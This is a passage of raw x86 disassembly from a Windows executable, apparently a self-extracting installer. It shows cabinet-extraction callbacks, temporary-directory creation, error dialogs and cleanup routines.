  404de3:	bb e4 91 40 00       	mov    $0x4091e4,%ebx
  404de8:	8b cb                	mov    %ebx,%ecx
  404dea:	8d 51 01             	lea    0x1(%ecx),%edx
  404ded:	8a 01                	mov    (%ecx),%al
  404def:	41                   	inc    %ecx
  404df0:	84 c0                	test   %al,%al
  404df2:	75 f9                	jne    0x404ded
  404df4:	2b ca                	sub    %edx,%ecx
  404df6:	8b 56 04             	mov    0x4(%esi),%edx
  404df9:	8d 7a 01             	lea    0x1(%edx),%edi
  404dfc:	8a 02                	mov    (%edx),%al
  404dfe:	42                   	inc    %edx
  404dff:	84 c0                	test   %al,%al
  404e01:	75 f9                	jne    0x404dfc
  404e03:	2b d7                	sub    %edi,%edx
  404e05:	8d 41 01             	lea    0x1(%ecx),%eax
  404e08:	03 c2                	add    %edx,%eax
  404e0a:	3d 04 01 00 00       	cmp    $0x104,%eax
  404e0f:	0f 8d ee fe ff ff    	jge    0x404d03
  404e15:	ff 76 04             	push   0x4(%esi)
  404e18:	8b d3                	mov    %ebx,%edx
  404e1a:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  404e20:	e8 dd f8 ff ff       	call   0x404702
  404e25:	85 c0                	test   %eax,%eax
  404e27:	0f 84 d6 fe ff ff    	je     0x404d03
  404e2d:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  404e33:	e8 35 f9 ff ff       	call   0x40476d
  404e38:	85 c0                	test   %eax,%eax
  404e3a:	0f 84 ef fe ff ff    	je     0x404d2f
  404e40:	68 80 01 00 00       	push   $0x180
  404e45:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  404e4b:	68 02 83 00 00       	push   $0x8302
  404e50:	50                   	push   %eax
  404e51:	e8 2a fb ff ff       	call   0x404980
  404e56:	8b f0                	mov    %eax,%esi
  404e58:	83 c4 0c             	add    $0xc,%esp
  404e5b:	83 fe ff             	cmp    $0xffffffff,%esi
  404e5e:	0f 84 9f fe ff ff    	je     0x404d03
  404e64:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  404e6a:	e8 71 f9 ff ff       	call   0x4047e0
  404e6f:	85 c0                	test   %eax,%eax
  404e71:	0f 84 8c fe ff ff    	je     0x404d03
  404e77:	ff 05 f4 93 40 00    	incl   0x4093f4
  404e7d:	8b c6                	mov    %esi,%eax
  404e7f:	eb 07                	jmp    0x404e88
  404e81:	8b ce                	mov    %esi,%ecx
  404e83:	e8 11 00 00 00       	call   0x404e99
  404e88:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404e8b:	5f                   	pop    %edi
  404e8c:	5e                   	pop    %esi
  404e8d:	33 cd                	xor    %ebp,%ecx
  404e8f:	5b                   	pop    %ebx
  404e90:	e8 4b 1e 00 00       	call   0x406ce0
  404e95:	8b e5                	mov    %ebp,%esp
  404e97:	5d                   	pop    %ebp
  404e98:	c3                   	ret
  404e99:	8b ff                	mov    %edi,%edi
  404e9b:	53                   	push   %ebx
  404e9c:	56                   	push   %esi
  404e9d:	8b d9                	mov    %ecx,%ebx
  404e9f:	be 1c 97 40 00       	mov    $0x40971c,%esi
  404ea4:	57                   	push   %edi
  404ea5:	b9 c4 00 00 00       	mov    $0xc4,%ecx
  404eaa:	bf 0c 94 40 00       	mov    $0x40940c,%edi
  404eaf:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404eb1:	ff 73 0c             	push   0xc(%ebx)
  404eb4:	be 04 01 00 00       	mov    $0x104,%esi
  404eb9:	b9 1c 97 40 00       	mov    $0x40971c,%ecx
  404ebe:	8b d6                	mov    %esi,%edx
  404ec0:	e8 bb c7 ff ff       	call   0x401680
  404ec5:	ff 73 04             	push   0x4(%ebx)
  404ec8:	8b d6                	mov    %esi,%edx
  404eca:	b9 20 98 40 00       	mov    $0x409820,%ecx
  404ecf:	e8 ac c7 ff ff       	call   0x401680
  404ed4:	ff 73 08             	push   0x8(%ebx)
  404ed7:	8b d6                	mov    %esi,%edx
  404ed9:	b9 24 99 40 00       	mov    $0x409924,%ecx
  404ede:	e8 9d c7 ff ff       	call   0x401680
  404ee3:	66 8b 43 1e          	mov    0x1e(%ebx),%ax
  404ee7:	66 a3 28 9a 40 00    	mov    %ax,0x409a28
  404eed:	66 8b 43 20          	mov    0x20(%ebx),%ax
  404ef1:	5f                   	pop    %edi
  404ef2:	5e                   	pop    %esi
  404ef3:	66 a3 2a 9a 40 00    	mov    %ax,0x409a2a
  404ef9:	33 c0                	xor    %eax,%eax
  404efb:	5b                   	pop    %ebx
  404efc:	c3                   	ret
  404efd:	8b ff                	mov    %edi,%edi
  404eff:	55                   	push   %ebp
  404f00:	8b ec                	mov    %esp,%ebp
  404f02:	83 ec 28             	sub    $0x28,%esp
  404f05:	a1 04 80 40 00       	mov    0x408004,%eax
  404f0a:	33 c5                	xor    %ebp,%eax
  404f0c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404f0f:	56                   	push   %esi
  404f10:	57                   	push   %edi
  404f11:	6a 06                	push   $0x6
  404f13:	59                   	pop    %ecx
  404f14:	33 c0                	xor    %eax,%eax
  404f16:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  404f19:	f3 ab                	rep stos %eax,%es:(%edi)
  404f1b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404f1e:	50                   	push   %eax
  404f1f:	6a 01                	push   $0x1
  404f21:	68 c0 4b 40 00       	push   $0x404bc0
  404f26:	68 60 4b 40 00       	push   $0x404b60
  404f2b:	68 d0 4a 40 00       	push   $0x404ad0
  404f30:	68 50 4a 40 00       	push   $0x404a50
  404f35:	68 80 49 40 00       	push   $0x404980
  404f3a:	68 c0 4c 40 00       	push   $0x404cc0
  404f3f:	68 a0 4c 40 00       	push   $0x404ca0
  404f44:	ff 15 50 a0 40 00    	call   *0x40a050
  404f4a:	8b f8                	mov    %eax,%edi
  404f4c:	83 c4 24             	add    $0x24,%esp
  404f4f:	85 ff                	test   %edi,%edi
  404f51:	74 65                	je     0x404fb8
  404f53:	68 80 01 00 00       	push   $0x180
  404f58:	68 00 80 00 00       	push   $0x8000
  404f5d:	68 cc 81 40 00       	push   $0x4081cc
  404f62:	e8 19 fa ff ff       	call   0x404980
  404f67:	8b f0                	mov    %eax,%esi
  404f69:	83 c4 0c             	add    $0xc,%esp
  404f6c:	83 fe ff             	cmp    $0xffffffff,%esi
  404f6f:	74 47                	je     0x404fb8
  404f71:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404f74:	50                   	push   %eax
  404f75:	56                   	push   %esi
  404f76:	57                   	push   %edi
  404f77:	ff 15 4c a0 40 00    	call   *0x40a04c
  404f7d:	83 c4 0c             	add    $0xc,%esp
  404f80:	85 c0                	test   %eax,%eax
  404f82:	74 34                	je     0x404fb8
  404f84:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404f87:	3b 05 44 91 40 00    	cmp    0x409144,%eax
  404f8d:	75 29                	jne    0x404fb8
  404f8f:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404f93:	75 23                	jne    0x404fb8
  404f95:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404f99:	75 1d                	jne    0x404fb8
  404f9b:	56                   	push   %esi
  404f9c:	e8 bf fb ff ff       	call   0x404b60
  404fa1:	59                   	pop    %ecx
  404fa2:	83 f8 ff             	cmp    $0xffffffff,%eax
  404fa5:	74 11                	je     0x404fb8
  404fa7:	57                   	push   %edi
  404fa8:	ff 15 48 a0 40 00    	call   *0x40a048
  404fae:	59                   	pop    %ecx
  404faf:	85 c0                	test   %eax,%eax
  404fb1:	74 05                	je     0x404fb8
  404fb3:	33 c0                	xor    %eax,%eax
  404fb5:	40                   	inc    %eax
  404fb6:	eb 02                	jmp    0x404fba
  404fb8:	33 c0                	xor    %eax,%eax
  404fba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404fbd:	5f                   	pop    %edi
  404fbe:	33 cd                	xor    %ebp,%ecx
  404fc0:	5e                   	pop    %esi
  404fc1:	e8 1a 1d 00 00       	call   0x406ce0
  404fc6:	8b e5                	mov    %ebp,%esp
  404fc8:	5d                   	pop    %ebp
  404fc9:	c3                   	ret
  404fca:	cc                   	int3
  404fcb:	cc                   	int3
  404fcc:	cc                   	int3
  404fcd:	cc                   	int3
  404fce:	cc                   	int3
  404fcf:	cc                   	int3
  404fd0:	cc                   	int3
  404fd1:	cc                   	int3
  404fd2:	cc                   	int3
  404fd3:	cc                   	int3
  404fd4:	cc                   	int3
  404fd5:	cc                   	int3
  404fd6:	cc                   	int3
  404fd7:	cc                   	int3
  404fd8:	cc                   	int3
  404fd9:	cc                   	int3
  404fda:	cc                   	int3
  404fdb:	cc                   	int3
  404fdc:	cc                   	int3
  404fdd:	cc                   	int3
  404fde:	cc                   	int3
  404fdf:	cc                   	int3
  404fe0:	8b ff                	mov    %edi,%edi
  404fe2:	53                   	push   %ebx
  404fe3:	56                   	push   %esi
  404fe4:	33 db                	xor    %ebx,%ebx
  404fe6:	be 4c 13 40 00       	mov    $0x40134c,%esi
  404feb:	53                   	push   %ebx
  404fec:	33 d2                	xor    %edx,%edx
  404fee:	8b ce                	mov    %esi,%ecx
  404ff0:	e8 9a f6 ff ff       	call   0x40468f
  404ff5:	6a 0a                	push   $0xa
  404ff7:	56                   	push   %esi
  404ff8:	53                   	push   %ebx
  404ff9:	a3 44 91 40 00       	mov    %eax,0x409144
  404ffe:	ff 15 e0 a0 40 00    	call   *0x40a0e0
  405004:	50                   	push   %eax
  405005:	53                   	push   %ebx
  405006:	ff 15 28 a1 40 00    	call   *0x40a128
  40500c:	50                   	push   %eax
  40500d:	ff 15 18 a1 40 00    	call   *0x40a118
  405013:	a3 40 91 40 00       	mov    %eax,0x409140
  405018:	85 c0                	test   %eax,%eax
  40501a:	0f 84 41 01 00 00    	je     0x405161
  405020:	a1 84 85 40 00       	mov    0x408584,%eax
  405025:	85 c0                	test   %eax,%eax
  405027:	74 2e                	je     0x405057
  405029:	53                   	push   %ebx
  40502a:	68 42 08 00 00       	push   $0x842
  40502f:	50                   	push   %eax
  405030:	ff 15 00 a2 40 00    	call   *0x40a200
  405036:	50                   	push   %eax
  405037:	ff 15 b4 a1 40 00    	call   *0x40a1b4
  40503d:	6a 05                	push   $0x5
  40503f:	68 41 08 00 00       	push   $0x841
  405044:	ff 35 84 85 40 00    	push   0x408584
  40504a:	ff 15 00 a2 40 00    	call   *0x40a200
  405050:	50                   	push   %eax
  405051:	ff 15 b4 a1 40 00    	call   *0x40a1b4
  405057:	e8 a1 fe ff ff       	call   0x404efd
  40505c:	85 c0                	test   %eax,%eax
  40505e:	75 1c                	jne    0x40507c
  405060:	8b 0d 84 85 40 00    	mov    0x408584,%ecx
  405066:	ba ba 04 00 00       	mov    $0x4ba,%edx
  40506b:	53                   	push   %ebx
  40506c:	6a 10                	push   $0x10
  40506e:	53                   	push   %ebx
  40506f:	53                   	push   %ebx
  405070:	e8 44 f4 ff ff       	call   0x4044b9
  405075:	8b f3                	mov    %ebx,%esi
  405077:	e9 8b 00 00 00       	jmp    0x405107
  40507c:	57                   	push   %edi
  40507d:	68 48 91 40 00       	push   $0x409148
  405082:	6a 01                	push   $0x1
  405084:	68 c0 4b 40 00       	push   $0x404bc0
  405089:	68 60 4b 40 00       	push   $0x404b60
  40508e:	68 d0 4a 40 00       	push   $0x404ad0
  405093:	68 50 4a 40 00       	push   $0x404a50
  405098:	68 80 49 40 00       	push   $0x404980
  40509d:	68 c0 4c 40 00       	push   $0x404cc0
  4050a2:	68 a0 4c 40 00       	push   $0x404ca0
  4050a7:	ff 15 50 a0 40 00    	call   *0x40a050
  4050ad:	8b f8                	mov    %eax,%edi
  4050af:	83 c4 24             	add    $0x24,%esp
  4050b2:	85 ff                	test   %edi,%edi
  4050b4:	74 32                	je     0x4050e8
  4050b6:	68 40 91 40 00       	push   $0x409140
  4050bb:	53                   	push   %ebx
  4050bc:	68 d0 4c 40 00       	push   $0x404cd0
  4050c1:	53                   	push   %ebx
  4050c2:	68 40 11 40 00       	push   $0x401140
  4050c7:	68 cc 81 40 00       	push   $0x4081cc
  4050cc:	57                   	push   %edi
  4050cd:	ff 15 44 a0 40 00    	call   *0x40a044
  4050d3:	8b f0                	mov    %eax,%esi
  4050d5:	83 c4 1c             	add    $0x1c,%esp
  4050d8:	85 f6                	test   %esi,%esi
  4050da:	74 2a                	je     0x405106
  4050dc:	57                   	push   %edi
  4050dd:	ff 15 48 a0 40 00    	call   *0x40a048
  4050e3:	59                   	pop    %ecx
  4050e4:	85 c0                	test   %eax,%eax
  4050e6:	75 1e                	jne    0x405106
  4050e8:	8b 15 48 91 40 00    	mov    0x409148,%edx
  4050ee:	8b 0d 84 85 40 00    	mov    0x408584,%ecx
  4050f4:	53                   	push   %ebx
  4050f5:	6a 10                	push   $0x10
  4050f7:	53                   	push   %ebx
  4050f8:	53                   	push   %ebx
  4050f9:	8d 92 14 05 00 00    	lea    0x514(%edx),%edx
  4050ff:	e8 b5 f3 ff ff       	call   0x4044b9
  405104:	8b f3                	mov    %ebx,%esi
  405106:	5f                   	pop    %edi
  405107:	a1 40 91 40 00       	mov    0x409140,%eax
  40510c:	85 c0                	test   %eax,%eax
  40510e:	74 0d                	je     0x40511d
  405110:	50                   	push   %eax
  405111:	ff 15 f4 a0 40 00    	call   *0x40a0f4
  405117:	89 1d 40 91 40 00    	mov    %ebx,0x409140
  40511d:	85 f6                	test   %esi,%esi
  40511f:	75 19                	jne    0x40513a
  405121:	39 1d d8 91 40 00    	cmp    %ebx,0x4091d8
  405127:	75 11                	jne    0x40513a
  405129:	53                   	push   %ebx
  40512a:	6a 10                	push   $0x10
  40512c:	53                   	push   %ebx
  40512d:	53                   	push   %ebx
  40512e:	ba f8 04 00 00       	mov    $0x4f8,%edx
  405133:	33 c9                	xor    %ecx,%ecx
  405135:	e8 7f f3 ff ff       	call   0x4044b9
  40513a:	f6 05 38 8a 40 00 01 	testb  $0x1,0x408a38
  405141:	75 1c                	jne    0x40515f
  405143:	f6 05 34 9a 40 00 01 	testb  $0x1,0x409a34
  40514a:	75 13                	jne    0x40515f
  40514c:	53                   	push   %ebx
  40514d:	56                   	push   %esi
  40514e:	68 a1 0f 00 00       	push   $0xfa1
  405153:	ff 35 84 85 40 00    	push   0x408584
  405159:	ff 15 04 a2 40 00    	call   *0x40a204
  40515f:	8b c6                	mov    %esi,%eax
  405161:	5e                   	pop    %esi
  405162:	5b                   	pop    %ebx
  405163:	c3                   	ret
  405164:	6a 24                	push   $0x24
  405166:	ba e0 89 40 00       	mov    $0x4089e0,%edx
  40516b:	b9 54 13 40 00       	mov    $0x401354,%ecx
  405170:	e8 1a f5 ff ff       	call   0x40468f
  405175:	83 f8 24             	cmp    $0x24,%eax
  405178:	74 20                	je     0x40519a
  40517a:	ba b1 04 00 00       	mov    $0x4b1,%edx
  40517f:	33 c0                	xor    %eax,%eax
  405181:	33 c9                	xor    %ecx,%ecx
  405183:	50                   	push   %eax
  405184:	6a 10                	push   $0x10
  405186:	50                   	push   %eax
  405187:	50                   	push   %eax
  405188:	e8 2c f3 ff ff       	call   0x4044b9
  40518d:	c7 05 24 91 40 00 14 	movl   $0x80070714,0x409124
  405194:	07 07 80 
  405197:	33 c0                	xor    %eax,%eax
  405199:	c3                   	ret
  40519a:	a1 00 8a 40 00       	mov    0x408a00,%eax
  40519f:	a3 f8 93 40 00       	mov    %eax,0x4093f8
  4051a4:	85 c0                	test   %eax,%eax
  4051a6:	75 07                	jne    0x4051af
  4051a8:	ba c6 04 00 00       	mov    $0x4c6,%edx
  4051ad:	eb d0                	jmp    0x40517f
  4051af:	6a 04                	push   $0x4
  4051b1:	ba 38 9a 40 00       	mov    $0x409a38,%edx
  4051b6:	b9 60 13 40 00       	mov    $0x401360,%ecx
  4051bb:	e8 cf f4 ff ff       	call   0x40468f
  4051c0:	b9 80 63 40 00       	mov    $0x406380,%ecx
  4051c5:	e8 ce 10 00 00       	call   0x406298
  4051ca:	85 c0                	test   %eax,%eax
  4051cc:	75 13                	jne    0x4051e1
  4051ce:	50                   	push   %eax
  4051cf:	6a 10                	push   $0x10
  4051d1:	50                   	push   %eax
  4051d2:	50                   	push   %eax
  4051d3:	ba c6 04 00 00       	mov    $0x4c6,%edx
  4051d8:	33 c9                	xor    %ecx,%ecx
  4051da:	e8 da f2 ff ff       	call   0x4044b9
  4051df:	eb b6                	jmp    0x405197
  4051e1:	33 c0                	xor    %eax,%eax
  4051e3:	40                   	inc    %eax
  4051e4:	c3                   	ret
  4051e5:	8b ff                	mov    %edi,%edi
  4051e7:	53                   	push   %ebx
  4051e8:	56                   	push   %esi
  4051e9:	57                   	push   %edi
  4051ea:	33 db                	xor    %ebx,%ebx
  4051ec:	33 d2                	xor    %edx,%edx
  4051ee:	53                   	push   %ebx
  4051ef:	b9 70 13 40 00       	mov    $0x401370,%ecx
  4051f4:	e8 96 f4 ff ff       	call   0x40468f
  4051f9:	8b f0                	mov    %eax,%esi
  4051fb:	8d 4e 01             	lea    0x1(%esi),%ecx
  4051fe:	51                   	push   %ecx
  4051ff:	6a 40                	push   $0x40
  405201:	ff 15 50 a1 40 00    	call   *0x40a150
  405207:	8b f8                	mov    %eax,%edi
  405209:	85 ff                	test   %edi,%edi
  40520b:	75 20                	jne    0x40522d
  40520d:	53                   	push   %ebx
  40520e:	6a 10                	push   $0x10
  405210:	53                   	push   %ebx
  405211:	53                   	push   %ebx
  405212:	ba b5 04 00 00       	mov    $0x4b5,%edx
  405217:	33 c9                	xor    %ecx,%ecx
  405219:	e8 9b f2 ff ff       	call   0x4044b9
  40521e:	e8 62 10 00 00       	call   0x406285
  405223:	a3 24 91 40 00       	mov    %eax,0x409124
  405228:	e9 83 00 00 00       	jmp    0x4052b0
  40522d:	56                   	push   %esi
  40522e:	8b d7                	mov    %edi,%edx
  405230:	b9 70 13 40 00       	mov    $0x401370,%ecx
  405235:	e8 55 f4 ff ff       	call   0x40468f
  40523a:	85 c0                	test   %eax,%eax
  40523c:	75 24                	jne    0x405262
  40523e:	53                   	push   %ebx
  40523f:	6a 10                	push   $0x10
  405241:	53                   	push   %ebx
  405242:	53                   	push   %ebx
  405243:	ba b1 04 00 00       	mov    $0x4b1,%edx
  405248:	33 c9                	xor    %ecx,%ecx
  40524a:	e8 6a f2 ff ff       	call   0x4044b9
  40524f:	57                   	push   %edi
  405250:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  405256:	c7 05 24 91 40 00 14 	movl   $0x80070714,0x409124
  40525d:	07 07 80 
  405260:	eb 4e                	jmp    0x4052b0
  405262:	68 c0 12 40 00       	push   $0x4012c0
  405267:	57                   	push   %edi
  405268:	ff 15 d4 a0 40 00    	call   *0x40a0d4
  40526e:	85 c0                	test   %eax,%eax
  405270:	75 0c                	jne    0x40527e
  405272:	57                   	push   %edi
  405273:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  405279:	33 c0                	xor    %eax,%eax
  40527b:	40                   	inc    %eax
  40527c:	eb 34                	jmp    0x4052b2
  40527e:	6a 04                	push   $0x4
  405280:	6a 20                	push   $0x20
  405282:	53                   	push   %ebx
  405283:	57                   	push   %edi
  405284:	ba e9 03 00 00       	mov    $0x3e9,%edx
  405289:	33 c9                	xor    %ecx,%ecx
  40528b:	e8 29 f2 ff ff       	call   0x4044b9
  405290:	57                   	push   %edi
  405291:	8b f0                	mov    %eax,%esi
  405293:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  405299:	83 fe 06             	cmp    $0x6,%esi
  40529c:	75 08                	jne    0x4052a6
  40529e:	89 1d 24 91 40 00    	mov    %ebx,0x409124
  4052a4:	eb d3                	jmp    0x405279
  4052a6:	c7 05 24 91 40 00 c7 	movl   $0x800704c7,0x409124
  4052ad:	04 07 80 
  4052b0:	33 c0                	xor    %eax,%eax
  4052b2:	5f                   	pop    %edi
  4052b3:	5e                   	pop    %esi
  4052b4:	5b                   	pop    %ebx
  4052b5:	c3                   	ret
  4052b6:	8b ff                	mov    %edi,%edi
  4052b8:	55                   	push   %ebp
  4052b9:	8b ec                	mov    %esp,%ebp
  4052bb:	81 ec 08 01 00 00    	sub    $0x108,%esp
  4052c1:	a1 04 80 40 00       	mov    0x408004,%eax
  4052c6:	33 c5                	xor    %ebp,%eax
  4052c8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4052cb:	56                   	push   %esi
  4052cc:	8b 35 e0 91 40 00    	mov    0x4091e0,%esi
  4052d2:	85 f6                	test   %esi,%esi
  4052d4:	74 41                	je     0x405317
  4052d6:	57                   	push   %edi
  4052d7:	83 3d 24 8a 40 00 00 	cmpl   $0x0,0x408a24
  4052de:	8b fe                	mov    %esi,%edi
  4052e0:	75 1e                	jne    0x405300
  4052e2:	83 3d 30 9a 40 00 00 	cmpl   $0x0,0x409a30
  4052e9:	75 15                	jne    0x405300
  4052eb:	68 80 00 00 00       	push   $0x80
  4052f0:	ff 36                	push   (%esi)
  4052f2:	ff 15 98 a0 40 00    	call   *0x40a098
  4052f8:	ff 36                	push   (%esi)
  4052fa:	ff 15 7c a0 40 00    	call   *0x40a07c
  405300:	ff 37                	push   (%edi)
  405302:	8b 76 04             	mov    0x4(%esi),%esi
  405305:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  40530b:	57                   	push   %edi
  40530c:	ff 15 a4 a0 40 00    	call   *0x40a0a4
  405312:	85 f6                	test   %esi,%esi
  405314:	75 c1                	jne    0x4052d7
  405316:	5f                   	pop    %edi
  405317:	a1 20 8a 40 00       	mov    0x408a20,%eax
  40531c:	5e                   	pop    %esi
  40531d:	85 c0                	test   %eax,%eax
  40531f:	74 58                	je     0x405379
  405321:	83 3d 24 8a 40 00 00 	cmpl   $0x0,0x408a24
  405328:	75 4f                	jne    0x405379
  40532a:	83 3d 30 9a 40 00 00 	cmpl   $0x0,0x409a30
  405331:	75 46                	jne    0x405379
  405333:	51                   	push   %ecx
  405334:	68 e4 91 40 00       	push   $0x4091e4
  405339:	51                   	push   %ecx
  40533a:	ba 04 01 00 00       	mov    $0x104,%edx
  40533f:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  405345:	e8 37 c4 ff ff       	call   0x401781
  40534a:	f6 05 34 9a 40 00 20 	testb  $0x20,0x409a34
  405351:	74 0b                	je     0x40535e
  405353:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  405359:	e8 8a 12 00 00       	call   0x4065e8
  40535e:	68 fc 11 40 00       	push   $0x4011fc
  405363:	ff 15 fc a0 40 00    	call   *0x40a0fc
  405369:	8d 8d f8 fe ff ff    	lea    -0x108(%ebp),%ecx
  40536f:	e8 1c d0 ff ff       	call   0x402390
  405374:	a1 20 8a 40 00       	mov    0x408a20,%eax
  405379:	66 83 3d 40 9a 40 00 	cmpw   $0x1,0x409a40
  405380:	01 
  405381:	74 09                	je     0x40538c
  405383:	85 c0                	test   %eax,%eax
  405385:	74 05                	je     0x40538c
  405387:	e8 55 cc ff ff       	call   0x401fe1
  40538c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40538f:	83 25 20 8a 40 00 00 	andl   $0x0,0x408a20
  405396:	33 cd                	xor    %ebp,%ecx
  405398:	e8 43 19 00 00       	call   0x406ce0
  40539d:	8b e5                	mov    %ebp,%esp
  40539f:	5d                   	pop    %ebp
  4053a0:	c3                   	ret
  4053a1:	8b ff                	mov    %edi,%edi
  4053a3:	55                   	push   %ebp
  4053a4:	8b ec                	mov    %esp,%ebp
  4053a6:	81 ec 08 01 00 00    	sub    $0x108,%esp
  4053ac:	a1 04 80 40 00       	mov    0x408004,%eax
  4053b1:	33 c5                	xor    %ebp,%eax
  4053b3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4053b6:	53                   	push   %ebx
  4053b7:	56                   	push   %esi
  4053b8:	57                   	push   %edi
  4053b9:	8b f2                	mov    %edx,%esi
  4053bb:	8b d9                	mov    %ecx,%ebx
  4053bd:	33 ff                	xor    %edi,%edi
  4053bf:	57                   	push   %edi
  4053c0:	68 78 13 40 00       	push   $0x401378
  4053c5:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4053cb:	68 04 01 00 00       	push   $0x104
  4053d0:	50                   	push   %eax
  4053d1:	e8 48 c3 ff ff       	call   0x40171e
  4053d6:	83 c4 10             	add    $0x10,%esp
  4053d9:	ba 04 01 00 00       	mov    $0x104,%edx
  4053de:	8b ce                	mov    %esi,%ecx
  4053e0:	47                   	inc    %edi
  4053e1:	53                   	push   %ebx
  4053e2:	e8 99 c2 ff ff       	call   0x401680
  4053e7:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4053ed:	ba 04 01 00 00       	mov    $0x104,%edx
  4053f2:	50                   	push   %eax
  4053f3:	8b ce                	mov    %esi,%ecx
  4053f5:	e8 90 11 00 00       	call   0x40658a
  4053fa:	56                   	push   %esi
  4053fb:	ff 15 a8 a0 40 00    	call   *0x40a0a8
  405401:	56                   	push   %esi
  405402:	ff 15 70 a0 40 00    	call   *0x40a070
  405408:	83 f8 ff             	cmp    $0xffffffff,%eax
  40540b:	74 42                	je     0x40544f
  40540d:	81 ff 90 01 00 00    	cmp    $0x190,%edi
  405413:	7c aa                	jl     0x4053bf
  405415:	56                   	push   %esi
  405416:	33 ff                	xor    %edi,%edi
  405418:	57                   	push   %edi
  405419:	68 84 13 40 00       	push   $0x401384
  40541e:	53                   	push   %ebx
  40541f:	ff 15 3c a1 40 00    	call   *0x40a13c
  405425:	85 c0                	test   %eax,%eax
  405427:	74 11                	je     0x40543a
  405429:	56                   	push   %esi
  40542a:	47                   	inc    %edi
  40542b:	ff 15 7c a0 40 00    	call   *0x40a07c
  405431:	6a 00                	push   $0x0
  405433:	56                   	push   %esi
  405434:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  40543a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40543d:	8b c7                	mov    %edi,%eax
  40543f:	5f                   	pop    %edi
  405440:	5e                   	pop    %esi
  405441:	33 cd                	xor    %ebp,%ecx
  405443:	5b                   	pop    %ebx
  405444:	e8 97 18 00 00       	call   0x406ce0
  405449:	8b e5                	mov    %ebp,%esp
  40544b:	5d                   	pop    %ebp
  40544c:	c2 04 00             	ret    $0x4
  40544f:	6a 00                	push   $0x0
  405451:	56                   	push   %esi
  405452:	ff 15 b4 a0 40 00    	call   *0x40a0b4
  405458:	85 c0                	test   %eax,%eax
  40545a:	74 b9                	je     0x405415
  40545c:	33 ff                	xor    %edi,%edi
  40545e:	47                   	inc    %edi
  40545f:	89 3d 20 8a 40 00    	mov    %edi,0x408a20
  405465:	eb d3                	jmp    0x40543a
  405467:	8b ff                	mov    %edi,%edi
  405469:	55                   	push   %ebp
  40546a:	8b ec                	mov    %esp,%ebp
  40546c:	81 ec 2c 01 00 00    	sub    $0x12c,%esp
  405472:	a1 04 80 40 00       	mov    0x408004,%eax
  405477:	33 c5                	xor    %ebp,%eax
  405479:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40547c:	53                   	push   %ebx
  40547d:	56                   	push   %esi
  40547e:	57                   	push   %edi
  40547f:	33 db                	xor    %ebx,%ebx
  405481:	51                   	push   %ecx
  405482:	85 d2                	test   %edx,%edx
  405484:	0f 84 92 00 00 00    	je     0x40551c
  40548a:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  405490:	e8 0c ff ff ff       	call   0x4053a1
  405495:	85 c0                	test   %eax,%eax
  405497:	0f 84 e4 00 00 00    	je     0x405581
  40549d:	51                   	push   %ecx
  40549e:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  4054a4:	bf 04 01 00 00       	mov    $0x104,%edi
  4054a9:	50                   	push   %eax
  4054aa:	51                   	push   %ecx
  4054ab:	be e4 91 40 00       	mov    $0x4091e4,%esi
  4054b0:	8b d7                	mov    %edi,%edx
  4054b2:	8b ce                	mov    %esi,%ecx
  4054b4:	e8 c8 c2 ff ff       	call   0x401781
  4054b9:	f6 05 34 9a 40 00 20 	testb  $0x20,0x409a34
  4054c0:	74 4a                	je     0x40550c
  4054c2:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
  4054c8:	50                   	push   %eax
  4054c9:	ff 15 1c a1 40 00    	call   *0x40a11c
  4054cf:	0f b7 85 d4 fe ff ff 	movzwl -0x12c(%ebp),%eax
  4054d6:	2b c3                	sub    %ebx,%eax
  4054d8:	74 24                	je     0x4054fe
  4054da:	83 e8 01             	sub    $0x1,%eax
  4054dd:	74 18                	je     0x4054f7
  4054df:	83 e8 01             	sub    $0x1,%eax
  4054e2:	74 0c                	je     0x4054f0
  4054e4:	83 e8 01             	sub    $0x1,%eax
  4054e7:	75 23                	jne    0x40550c
  4054e9:	68 a0 13 40 00       	push   $0x4013a0
  4054ee:	eb 13                	jmp    0x405503
  4054f0:	68 98 13 40 00       	push   $0x401398
  4054f5:	eb 0c                	jmp    0x405503
  4054f7:	68 90 13 40 00       	push   $0x401390
  4054fc:	eb 05                	jmp    0x405503
  4054fe:	68 88 13 40 00       	push   $0x401388
  405503:	8b d7                	mov    %edi,%edx
  405505:	8b ce                	mov    %esi,%ecx
  405507:	e8 7e 10 00 00       	call   0x40658a
  40550c:	68 40 11 40 00       	push   $0x401140
  405511:	8b d7                	mov    %edi,%edx
  405513:	8b ce                	mov    %esi,%ecx
  405515:	e8 70 10 00 00       	call   0x40658a
  40551a:	eb 11                	jmp    0x40552d
  40551c:	be e4 91 40 00       	mov    $0x4091e4,%esi
  405521:	ba 04 01 00 00       	mov    $0x104,%edx
  405526:	8b ce                	mov    %esi,%ecx
  405528:	e8 53 c1 ff ff       	call   0x401680
  40552d:	8b ce                	mov    %esi,%ecx
